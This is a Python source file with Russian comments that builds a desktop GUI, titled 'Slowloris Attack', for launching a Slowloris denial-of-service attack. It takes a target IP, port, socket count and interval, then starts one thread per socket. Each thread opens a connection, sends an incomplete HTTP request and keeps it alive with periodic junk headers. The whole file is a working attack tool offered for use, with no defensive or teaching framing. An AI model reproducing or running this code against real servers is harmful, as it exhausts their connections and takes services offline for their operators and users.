import customtkinter as ctk
import socket
import time
import random
import threading

def clear_frame(frame):
    for widget in frame.winfo_children():
        widget.destroy()

def slowloris_ui(parent_frame, go_back_callback=None):
    clear_frame(parent_frame)  # Очистить перед созданием UI

    # Заголовок
    title = ctk.CTkLabel(parent_frame, text="Slowloris Attack 💀", font=("Arial", 24))
    title.place(relx=0.5, rely=0.1, anchor="center")

    # Поле ввода для IP-адреса
    ip_label = ctk.CTkLabel(parent_frame, text="IP Address:", font=("Arial", 16))
    ip_label.place(relx=0.3, rely=0.3, anchor="center")
    ip_entry = ctk.CTkEntry(parent_frame, width=200, font=("Arial", 16))
    ip_entry.place(relx=0.7, rely=0.3, anchor="center")

    # Поле ввода для порта
    port_label = ctk.CTkLabel(parent_frame, text="Port:", font=("Arial", 16))
    port_label.place(relx=0.3, rely=0.4, anchor="center")
    port_entry = ctk.CTkEntry(parent_frame, width=200, font=("Arial", 16))
    port_entry.place(relx=0.7, rely=0.4, anchor="center")

    # Поле ввода для количества сокетов
    sockets_label = ctk.CTkLabel(parent_frame, text="Sockets:", font=("Arial", 16))
    sockets_label.place(relx=0.3, rely=0.5, anchor="center")
    sockets_entry = ctk.CTkEntry(parent_frame, width=200, font=("Arial", 16))
    sockets_entry.place(relx=0.7, rely=0.5, anchor="center")

    # Поле ввода для интервала
    interval_label = ctk.CTkLabel(parent_frame, text="Interval (sec):", font=("Arial", 16))
    interval_label.place(relx=0.3, rely=0.6, anchor="center")
    interval_entry = ctk.CTkEntry(parent_frame, width=200, font=("Arial", 16))
    interval_entry.place(relx=0.7, rely=0.6, anchor="center")

    # Кнопка запуска атаки
    start_btn = ctk.CTkButton(
        parent_frame, 
        text="Start Attack", 
        fg_color="black", 
        border_color="#8d33ff", 
        hover_color="#2a104c", 
        border_width=2, 
        font=("Arial", 16), 
        command=lambda: start_attack(ip_entry.get(), port_entry.get(), sockets_entry.get(), interval_entry.get(), parent_frame), 
        width=parent_frame.winfo_width() * 0.7, 
        height=40
    )
    start_btn.place(relx=0.5, rely=0.7, anchor="center")

    # Textbox для вывода результатов
    text_box = ctk.CTkTextbox(parent_frame, width=400, height=200, font=("Arial", 12))
    text_box.place(relx=0.5, rely=0.85, anchor="center")

def update_text_box(text_box, message):
    """Функция для безопасного обновления текстового поля из потока"""
    text_box.insert("end", message + "\n")
    text_box.yview("end")  # Прокручиваем вниз

def start_attack(target, port, sockets, interval, parent_frame):
    try:
        target = str(target)
        port = int(port)
        sockets = int(sockets)
        interval = int(interval)

        print(f"[~] Атака на {target}:{port} с {sockets} сокетами через {interval} секунд")
        update_text_box(parent_frame.winfo_children()[-1], f"[~] Атака на {target}:{port} с {sockets} сокетами через {interval} секунд")

        # Здесь запускается логика атаки, например, многопоточность для каждого сокета
        for _ in range(sockets):
            threading.Thread(target=slowloris_socket, args=(target, port, interval, parent_frame)).start()

    except Exception as e:
        print(f"[!] Ошибка: {e}")
        update_text_box(parent_frame.winfo_children()[-1], f"[!] Ошибка: {e}")

def slowloris_socket(target, port, interval, parent_frame):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10)
        s.connect((target, port))
        message = f"[+] Подключено: {target}:{port}"
        print(message)
        update_text_box(parent_frame.winfo_children()[-1], message)

        # Отправляем неполный HTTP-запрос
        s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode("utf-8"))
        s.send(f"Host: {target}\r\n".encode("utf-8"))
        s.send("User-Agent: slowloris-test\r\n".encode("utf-8"))
        s.send("Content-Length: 10000\r\n".encode("utf-8"))

        while True:
            # Отправляем один дополнительный заголовок, чтобы держать соединение открытым
            time.sleep(interval)
            try:
                s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode("utf-8"))
                print("[>] Байт отправлен для поддержки соединения")
                update_text_box(parent_frame.winfo_children()[-1], "[>] Байт отправлен для поддержки соединения")
            except socket.error:
                print("[-] Соединение потеряно, выход из потока")
                update_text_box(parent_frame.winfo_children()[-1], "[-] Соединение потеряно, выход из потока")
                break

    except Exception as e:
        message = f"[!] Ошибка: {e}"
        print(message)
        update_text_box(parent_frame.winfo_children()[-1], message)
